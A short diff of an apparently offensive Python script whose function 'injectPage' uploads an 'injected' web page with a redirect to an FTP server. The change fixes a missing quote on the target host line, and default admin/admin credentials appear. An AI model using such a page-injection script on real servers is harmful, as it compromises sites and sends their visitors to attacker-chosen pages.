@@ -12,7 +12,7 @@ def injectPage(ftp, page, redirect):
     ftp.storlines('STOR ' + page, open(page + '.tmp'))
     print('[+] Uploaded Injected Page: ' + page)
 
-host = '127.0.0.1
+host = '127.0.0.1'
 username = 'admin'
 password = 'admin'
 
